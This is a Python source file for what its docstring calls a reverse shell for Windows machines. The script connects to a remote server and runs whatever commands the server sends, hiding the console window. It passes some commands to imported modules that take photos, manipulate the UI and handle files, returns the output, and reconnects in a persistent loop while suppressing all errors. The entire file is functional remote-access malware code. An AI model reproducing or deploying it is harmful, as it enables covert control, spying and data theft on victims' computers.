"""
This is a reverse shell written in Python for WINDOWS machine.
"""

# 1st party imports
import time
import subprocess
import sys
from typing import List

# local imports
from Utilities.ui_manager import UIManager
from Utilities.photographer import PhotoGrapher
from Utilities.file_manager import FileManager
from Utilities.socket_handler import SocketHandler
from commands import ShellCommands, Utils, BASE_PREFIX

# create instances
PHOTOGRAPHER = PhotoGrapher()
UI_MANAGER = UIManager()
FILE_MANAGER = FileManager()

def run_command(args: List[str], timeout: int = 15) -> str:
    """
    Run a command with timeout and return output.

    Args:
        args (List[str]): The list of commands to run.
        timeout (int, optional): The timeout in seconds. Defaults to 15.

    Returns:
        str: The output of the command.
    """

    # build common Popen kwargs
    popen_kwargs = dict(
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        universal_newlines=True,
        bufsize=1,
    )

    # On Windows prevent a new console window from flashing
    if sys.platform == "win32":
        popen_kwargs["creationflags"] = getattr(subprocess, "CREATE_NO_WINDOW", 0x08000000)

    # run the command
    proc = subprocess.Popen(args, **popen_kwargs)

    # get the output
    output = []
    start_time = time.time()

    while True:
        # check if timeout exceeded
        if time.time() - start_time > timeout:
            proc.kill()
            raise TimeoutError(f"Command timed out after {timeout} seconds")

        # read line if available (non-blocking read)
        line = proc.stdout.readline()
        if line:
            output.append(line)
        elif proc.poll() is not None:
            # process finished and no more output
            break
        else:
            # no output yet, small sleep to avoid busy wait
            time.sleep(0.1)

    # return the output
    return ''.join(output)


def handle_custom_command(command: List[str]) -> str:
    """
    This function handles custom commands received from the server.

    Args:
        command (List[str]): The list of commands to handle with args.

    Returns:
        str: The output of the whole command.
    """

    # if command is for photographer
    if command[0] == Utils.PHOTOGRAPHER.value:
        return PHOTOGRAPHER.handle_command(command[1:])

    # if command is for ui manager
    elif command[0] == Utils.UI_MANAGER.value:
        return UI_MANAGER.handle_command(command[1:])

    # if command is for file manager
    elif command[0] == Utils.FILE_MANAGER.value:
        return FILE_MANAGER.handle_command(command[1:])

    else:
        return "Failed to handle command: `{}`".format(" ".join(command))


def run_main_loop(attempts: int = 10):
    """
    The main loop for the reverse shell, continuously waiting for and executing commands received from the server.
    This function listens for commands sent from the connected server socket and processes them. It handles
    basic powershell commands and custom commands which starts with perform.

    Args:
        attempts (int, optional): The number of attempts to connect to the server. Defaults to 10.

    Flow:
    - Continuously receive commands from the server until 'exit-shell' is received.
    - If a valid command is received, it is executed.
    - Handle various exceptions including subprocess errors, general exceptions, and keyboard interrupts.
    - Send the output or error message back to the server.
    """

    while True:

        # create socket instance
        socket_manager = SocketHandler()

        # failed attemps
        failed_attemps = attempts

        while True:

            # get the command
            command = socket_manager.receive_command()

            # if the command is None, break
            if not isinstance(command, str):

                # decrement the failed attempts
                failed_attemps -= 1

                # if failed attemps is 0 create a new connection
                if failed_attemps <= 0:
                    break

                # wait for the next command
                continue

            else:
                # reset failed commands
                failed_attemps = 10

            # split the command in multiple commands
            commands = command.split(";")

            # handle each command
            for command in commands:

                # parse this command with args
                args = command.strip().split(" ")

                # handle exit command
                if args[0] == ShellCommands.EXIT_SHELL.value:
                    return

                try:

                    # if it is a custom command handle it
                    if args[0] == BASE_PREFIX:
                        cmd_output = handle_custom_command(args[1:])

                    # perform the general command
                    else:
                        cmd_output = run_command(args)

                # handle cmd errors
                except subprocess.CalledProcessError as e:
                    cmd_output = str(e.output)

                # handle basic errors
                except Exception as e:
                    cmd_output = str(e)

                # handle keyboard interrupt
                except KeyboardInterrupt as e:
                    cmd_output = str(e)

                # send the cmd_output
                if cmd_output:
                    socket_manager.send_output(cmd_output)

        # close the socket
        socket_manager.close()

        # sleep for 5 minutes before trying again
        time.sleep(300)


if __name__ == "__main__":

    # run the script
    try:
        run_main_loop()
    except Exception as e:
        pass
